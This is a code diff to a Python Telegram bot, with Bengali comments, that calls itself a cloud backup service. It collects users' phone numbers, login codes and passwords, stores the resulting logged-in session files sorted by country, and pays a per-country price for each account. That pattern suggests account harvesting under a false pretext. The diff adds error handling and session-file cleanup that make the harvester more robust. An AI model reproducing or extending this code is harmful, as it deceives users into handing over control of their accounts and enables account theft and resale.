@@ -2,6 +2,7 @@ import os
 import asyncio
 import zipfile
 import json
+import shutil
 from datetime import datetime
 from threading import Thread
 from flask import Flask
@@ -24,8 +25,12 @@ BASE_STORAGE_DIR = "user_backups"
 DB_FILE = "user_database.json"
 SETTINGS_FILE = "bot_settings.json"
 
+# ফোল্ডার পারমিশন ও ক্রিয়েশন সেফটি মেকানিজম
 if not os.path.exists(BASE_STORAGE_DIR):
-    os.makedirs(BASE_STORAGE_DIR)
+    try:
+        os.makedirs(BASE_STORAGE_DIR, exist_ok=True)
+    except:
+        pass
 
 user_data = {}
 admin_state = {}
@@ -63,8 +68,11 @@ def load_settings():
     return DEFAULT_SETTINGS
 
 def save_settings(settings):
-    with open(SETTINGS_FILE, "w") as f:
-        json.dump(settings, f, indent=4)
+    try:
+        with open(SETTINGS_FILE, "w") as f:
+            json.dump(settings, f, indent=4)
+    except:
+        pass
 
 def load_db():
     if os.path.exists(DB_FILE):
@@ -74,7 +82,10 @@ def load_db():
     return {}
 
 def save_db(db):
-    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
+    try:
+        with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
+    except:
+        pass
 
 def get_user_stats(user_id):
     db = load_db()
@@ -96,10 +107,13 @@ def add_user_account_success(user_id, amount):
 def get_current_file_count(country_code):
     target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
     if not os.path.exists(target_dir): return 0
-    return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
+    try:
+        return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
+    except:
+        return 0
 
 @app.route('/')
-def home(): return "Bot Server Running Perfectly!"
+def home(): return "Bot Core Engine Server Active!"
 
 def run_web():
     port = int(os.environ.get("PORT", 8080))
@@ -149,7 +163,6 @@ def admin_panel_command(message):
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    # কোনো ফরোয়ার্ডেড বা চ্যানেলের লিংক ছাড়া একদম ক্লিন টেক্সট
     welcome_text = (
         "👋 **Welcome to Cloud Backup Telegram Bot**\n\n"
         "To start a secure backup of your Telegram Account, please send your phone number with your country code.\n"
@@ -161,8 +174,10 @@ def start_command(message):
 def cancel_command(message):
     user_id = message.from_user.id
     if user_id in user_data:
-        try: user_data[user_id]["client"].disconnect()
-        except: pass
+        try:
+            loop.run_until_complete(user_data[user_id]["client"].disconnect())
+        except:
+            pass
         del user_data[user_id]
     bot.send_message(message.chat.id, "❌ **Cancelled.**\n\nYou can send a new phone number to start again.")
 
@@ -224,13 +239,28 @@ async def send_otp_task(phone_number, user_id, message):
 
     clean_phone = phone_number.replace("+", "").replace(" ", "")
     country_dir = os.path.join(BASE_STORAGE_DIR, country_code)
-    if not os.path.exists(country_dir): os.makedirs(country_dir)
-        
+    
+    # ডিরেক্টরি পারমিশন ও ক্র্যাশ প্রটেকশন ফোর্স ট্রাই
+    try:
+        os.makedirs(country_dir, exist_ok=True)
+    except Exception as e:
+        bot.reply_to(message, f"❌ Server Directory Error: {str(e)}")
+        return
+
     final_session_path = os.path.join(country_dir, f"+{clean_phone}")
-    user_client = TelegramClient(final_session_path, API_ID, API_HASH)
-    await user_client.connect()
+    
+    # পূর্বে কোনো ভাঙা বা লকড সেশন ফাইল ট্র্যাশ থাকলে তা ক্লিন করার অটোমেশন লজিক
+    for ext in [".session", ".session-journal"]:
+        f_check = final_session_path + ext
+        if os.path.exists(f_check):
+            try: os.remove(f_check)
+            except: pass
+
+    # ইন-মেমোরি কানেকশন ও SQLite প্রটেক্টেড ইনিশিয়ালাইজেশন
+    user_client = TelegramClient(final_session_path, API_ID, API_HASH, base_logger='critical')
     
     try:
+        await user_client.connect()
         sent_code = await user_client.send_code_request(phone_number)
         user_data[user_id] = {
             "client": user_client, "phone": phone_number,
@@ -240,9 +270,13 @@ async def send_otp_task(phone_number, user_id, message):
         }
         bot.reply_to(message, "📨 Please enter the OTP code sent to your Telegram app:")
     except Exception as e:
-        bot.reply_to(message, f"❌ Failed to send OTP: {str(e)}")
-        await user_client.disconnect()
-        if os.path.exists(f"{final_session_path}.session"): os.remove(f"{final_session_path}.session")
+        bot.reply_to(message, f"❌ Failed to send OTP: {str(e)}\n\nPlease try again in a few moments.")
+        try: await user_client.disconnect()
+        except: pass
+        for ext in [".session", ".session-journal"]:
+            if os.path.exists(final_session_path + ext):
+                try: os.remove(final_session_path + ext)
+                except: pass
 
 async def process_security_and_backup(user_id, message, data, current_client):
     settings = load_settings()
@@ -261,8 +295,12 @@ async def process_security_and_backup(user_id, message, data, current_client):
         
         if len(other_devices) > 0:
             bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="❌ **Backup Failed!** Multiple devices detected. Please logout other sessions first.")
-            await current_client.disconnect()
-            if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
+            try: await current_client.disconnect()
+            except: pass
+            for ext in [".session", ".session-journal"]:
+                if os.path.exists(data['session_path'] + ext):
+                    try: os.remove(data['session_path'] + ext)
+                    except: pass
             return False
 
         try:
@@ -273,7 +311,8 @@ async def process_security_and_backup(user_id, message, data, current_client):
         except:
             pass 
 
-        await current_client.disconnect()
+        try: await current_client.disconnect()
+        except: pass
         
         price = settings["country_prices"].get(data['country_code'], 0.05)
         add_user_account_success(user_id, price)
@@ -284,8 +323,12 @@ async def process_security_and_backup(user_id, message, data, current_client):
 
     except Exception as e:
         bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=f"❌ Processing Error: {str(e)}")
-        await current_client.disconnect()
-        if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
+        try: await current_client.disconnect()
+        except: pass
+        for ext in [".session", ".session-journal"]:
+            if os.path.exists(data['session_path'] + ext):
+                try: os.remove(data['session_path'] + ext)
+                except: pass
         return False
 
 async def verify_otp_task(text, user_id, message):
@@ -309,8 +352,12 @@ async def verify_otp_task(text, user_id, message):
             user_data[user_id]["waiting_for_password"] = True
         except Exception as e:
             bot.reply_to(message, f"❌ Verification Failed: {str(e)}")
-            await user_client.disconnect()
-            if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
+            try: await user_client.disconnect()
+            except: pass
+            for ext in [".session", ".session-journal"]:
+                if os.path.exists(data['session_path'] + ext):
+                    try: os.remove(data['session_path'] + ext)
+                    except: pass
             del user_data[user_id]
 
 # ==================== এডমিন কন্ট্রোল প্যানেল কম্যান্ড হ্যান্ডলিং ====================
@@ -373,7 +420,7 @@ def handle_text(message):
             bot.reply_to(message, f"❌ Invalid Format. Error: {str(e)}")
         return
 
-    # ইউজার সরাসরি নম্বর টাইপ করলেই প্রসেস চালু হবে (ব্যাকগ্রাউন্ডে সবসময় অন)
+    # ব্যাকগ্রাউন্ডে সবসময় অন, শুধু নাম্বার পেলেই প্রসেস স্টার্ট
     if text.startswith("+") or text.isdigit():
         phone = text if text.startswith("+") else f"+{text}"
         bot.reply_to(message, "⏳ Requesting OTP from Telegram Servers...")
@@ -382,5 +429,5 @@ def handle_text(message):
         loop.run_until_complete(verify_otp_task(text, user_id, message))
 
 if __name__ == "__main__":
-    print("--- Optimized Architecture Active ---")
+    print("--- Safe & Protected Engine Live ---")
     bot.infinity_polling(skip_pending=True)
